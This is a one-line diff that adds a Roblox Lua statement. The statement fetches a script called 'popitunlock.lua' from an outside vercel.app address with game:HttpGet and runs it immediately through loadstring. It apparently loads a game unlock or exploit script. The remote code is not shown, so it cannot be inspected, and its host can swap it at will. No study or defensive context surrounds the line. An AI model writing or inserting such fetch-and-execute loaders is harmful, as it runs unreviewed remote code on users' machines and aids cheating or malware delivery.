@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://institutionio.vercel.app/backend?file=bf4a7ac0-c753-4703-bd49-cafc3d788754=popitunlock.lua'))()
